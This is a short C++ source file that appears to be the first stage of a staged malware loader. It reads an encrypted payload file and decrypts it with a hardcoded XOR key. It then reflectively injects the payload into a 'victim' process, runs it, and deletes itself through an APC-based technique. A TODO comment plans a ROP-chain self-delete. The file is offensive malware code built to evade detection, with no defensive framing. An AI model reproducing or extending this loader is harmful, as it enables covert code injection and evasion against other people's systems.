#include "Stage0Logic.hpp"

namespace Stage0Logic
{

void run(const std::wstring& command_line)
{
    File stage1_encrypted_file(STAGE1_ENCRYPTED_FILENAME, FileAccess::GenericRead, FileShare::None, FileCreationDisposition::OpenExisting);
    ByteVector stage1_encrypted = stage1_encrypted_file.read(stage1_encrypted_file.size());
    ByteVector stage1 = simple_encryption::xor_bytes_with_hardcoded_key(stage1_encrypted);

    ReflectiveLoader stage1_loader(stage1, command_line);
    stage1_loader.inject_module();
    stage1_loader.run_module_in_victim();

    // TODO: Add SelfDeleteROP that injects a ROP chain -> Sleep for a few seconds and then DeleteFileW
    SelfDeleteAPC self_delete = SelfDeleteAPC(); // I can replace this in a simple call from stage1, but that is less fun :)
    self_delete.do_delete();
}

}